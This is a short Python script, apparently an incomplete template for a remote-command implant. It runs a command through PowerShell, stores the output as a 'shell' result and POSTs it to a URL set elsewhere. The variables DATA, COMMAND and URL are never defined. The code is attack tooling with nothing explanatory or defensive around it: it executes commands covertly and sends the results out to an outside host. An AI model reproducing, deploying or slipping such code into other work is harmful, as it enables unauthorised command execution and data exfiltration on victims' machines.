import subprocess,requests
data = DATA
cmd = COMMAND[2]
def runcmd(command):
	try:
		cmd = subprocess.Popen(['Powershell.exe',command],shell=True,stderr=True,stdout=subprocess.PIPE)
		res = cmd.communicate()
		print(res)
		return res
	except Exception as e:
		return f"Error : [{e}]"
def sendrequest(url,data):
    r = requests.post(url,data)


DATA["shell"] = runcmd(cmd)
print("sending shell")
sendrequest(URL,data)
